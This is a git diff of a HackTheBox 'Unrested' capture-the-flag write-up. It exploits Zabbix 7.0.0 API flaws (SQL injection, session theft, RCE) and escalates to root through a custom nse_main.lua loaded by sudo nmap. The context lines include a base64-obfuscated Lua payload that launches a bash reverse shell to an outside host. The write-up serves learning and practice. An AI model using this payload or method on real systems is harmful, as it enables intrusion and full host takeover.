@@ -8,7 +8,7 @@ tags: [Notes, Web Security, WhiteBox, CVE, Zabbix, SQL Injection, Privilege esca
 render_with_liquid: false
 ---
 
-![Logo](/assets/img/Unrested/unrested-logo-min.webp)
+![Logo](//assets/img/Unrested/unrested-logo-min.webp)
 
 ## Start
 The machine spawns with generated credentials, for me there were:
@@ -20,11 +20,11 @@ The machine spawns with generated credentials, for me there were:
 
 Begin with nmap and see that the machine has default web and zabbix agent’s ports opened:
 
-![image.png](assets/img/Unrested/image.png){: .shadow }
+![image.png](/assets/img/Unrested/image.png){: .shadow }
 
 When reaching web it declares to have Zabbix 7.0.0 running on it. This version was found to have 2 recently discovered CVEs: app’s privilege escalation and SQL injection, both affecting API endpoints.
 
-![image.png](assets/img/Unrested/image%201.png){: .shadow  }
+![image.png](/assets/img/Unrested/image%201.png){: .shadow  }
 
 ## CVE-2024-36467
 
@@ -242,7 +242,7 @@ AND u.userid IN …
 
 Check response:
 
-![image.png](assets/img/Unrested/image%202.png){: .shadow }
+![image.png](/assets/img/Unrested/image%202.png){: .shadow }
 
 Go further  and confirm nested SQL queries supported:
 ```json
@@ -267,18 +267,18 @@ Go further  and confirm nested SQL queries supported:
 For learning and prevention purpuses only!
 {: .prompt-tip }
 
-![image.png](assets/img/Unrested/image%203.png){: .shadow }
+![image.png](/assets/img/Unrested/image%203.png){: .shadow }
 
 and let us retrieve all the tables available since nested SQL queries work and we can do some things manually, but it is important to keep in mind, that this code limits our output to have only 1 row (we need to use **LIMIT 1**, **TOP 1**, concatenations, and other methods to get our output as 1 string). 
 In this case I gonna use **`GROUP_CONCAT`** MySQL method:
 
-![image.png](assets/img/Unrested/image%204.png){: .shadow }
+![image.png](/assets/img/Unrested/image%204.png){: .shadow }
 
 Let’s then retrieve superuser’s session(at first column names so we know what we call):
 
-![image.png](assets/img/Unrested/image%205.png){: .shadow }
+![image.png](/assets/img/Unrested/image%205.png){: .shadow }
 
-![image.png](assets/img/Unrested/image%206.png){: .shadow }
+![image.png](/assets/img/Unrested/image%206.png){: .shadow }
 
 Great, now we have a valid session of **`userid=1`** that belongs to Zabbix Administrator user(app’s superuser).
 
@@ -300,36 +300,36 @@ for running so we need also to know the hostid and interfaceid [^hostid]. lets g
 ```
 {: .nolineno }
 
-![image.png](assets/img/Unrested/image%207.png){: .shadow }
+![image.png](/assets/img/Unrested/image%207.png){: .shadow }
 
 ## Shell as Zabbix
 
 Create RCE confirmation with callback to my web server:
 
-![image.png](assets/img/Unrested/image%208.png){: .shadow }
+![image.png](/assets/img/Unrested/image%208.png){: .shadow }
 
-![image.png](assets/img/Unrested/image%209.png){: .shadow }
+![image.png](/assets/img/Unrested/image%209.png){: .shadow }
 
 Get a reverse shell:
 
-![image.png](assets/img/Unrested/image%2010.png){: .shadow }
+![image.png](/assets/img/Unrested/image%2010.png){: .shadow }
 
 Get a user flag from `/home/matthew/`
 
 ## Shell as root
 
 Check `sudo -l` and see that we can run sudo nmap command, but seems nmap is restricted.
-![image.png](assets/img/Unrested/image%2013.png){: .shadow }
+![image.png](/assets/img/Unrested/image%2013.png){: .shadow }
 we cannot run anything available on GTFObins but,  the internet and nmap’s documentation gives us information[^nmap-doc] that says that we can replace default data files of nmap, including scripts and main files that are usually in `/usr/share/nmap` or `/usr/local/share/nmap`
 
 The internet says that `nse_main.lua` is important file, that nmap loads, when executes default scripts with `-sC` flag. 
 Dropped RCE check `os.execute('touch /dev/shm/rcelol')` into our custom nse_main.lua file and trigger it with `--datadir`:
 
-![image.png](assets/img/Unrested/image%2011.png){: .shadow }
+![image.png](/assets/img/Unrested/image%2011.png){: .shadow }
 
 OK, to get root  shell and flag. I used `b3MuZXhlY3V0ZSgnZWNobyBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TUM0eE1DNHhOQzQxTUM4NU1EQXhJREErSmpFPSB8IGJhc2U2NCAtZCB8IGJhc2gnKTs=`:
 
-![image.png](assets/img/Unrested/image%2012.png){: .shadow }
+![image.png](/assets/img/Unrested/image%2012.png){: .shadow }
 
 [Completion](https://www.hackthebox.com/achievement/machine/124699/639)
 
